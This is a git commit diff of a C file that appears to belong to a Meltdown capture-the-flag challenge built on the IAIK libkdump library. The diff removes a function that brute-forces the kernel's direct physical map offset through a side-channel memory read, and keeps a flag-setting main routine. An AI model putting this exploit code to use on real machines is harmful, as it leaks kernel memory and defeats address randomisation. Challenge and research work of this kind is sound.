eb103f33492249c839f0fa50afa728924e6bac52
sirius <sirius.ustc@gmail.com>
2018-07-02 22:52:09 +0800

    add README

--- leak.c
+++ leak.c
@@ -1,70 +1,17 @@
 // include works of https://github.com/IAIK/meltdown
 #include "libkdump/libkdump.h"
+#include <sched.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sched.h>
 #include <string.h>
 #include <time.h>
 #define LEN 11
 
-int kaslr() {
-  size_t scratch[4096];
-  libkdump_config_t config;
-  size_t offset = DEFAULT_PHYSICAL_OFFSET;
-#ifdef __x86_64__
-  size_t step = 0x800000000ll;
-#else
-  size_t step = 0x1000000;
-#endif
-  size_t delta = -2 * step;
-  int progress = 0;
+char *secret = "You got the flag!! flag is: flag{";
 
-  libkdump_enable_debug(0);
-
-  config = libkdump_get_autoconfig();
-  config.retries = 10;
-  config.measurements = 1;
-
-  libkdump_init(config);
-
-  size_t var = (size_t)(scratch + 2048);
-  *(char *)var = 'X';
-
-  size_t start = libkdump_virt_to_phys(var);
-  if (!start) {
-    printf("Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
-    exit(1);
-  }
-
-  while (1) {
-    *(volatile char *)var = 'X';
-    *(volatile char *)var = 'X';
-    *(volatile char *)var = 'X';
-    *(volatile char *)var = 'X';
-    *(volatile char *)var = 'X';
-
-    int res = libkdump_read(start + offset + delta);
-    if (res == 'X') {
-      printf("\rDirect physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
-      fflush(stdout);
-      break;
-    } else {
-      delta += step;
-      if (delta >= -1ull - offset) {
-        delta = 0;
-        step >>= 4;
-      }
-      printf("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
-    }
-  }
-    libkdump_cleanup();
-    return 0;
-}
-
-int set_secret()
+int main(int argc, char const *argv[])
 {
-    char *secret = "You got the flag!! flag is: flag{";
-    int i;
+	int i;
     int len;
     char *message;
     libkdump_config_t config;
@@ -106,10 +53,4 @@ int set_secret()
     libkdump_cleanup();
     /* code */
     return 0;
-}
-
-int main()
-{
-  kaslr();
-  set_secret();
 }
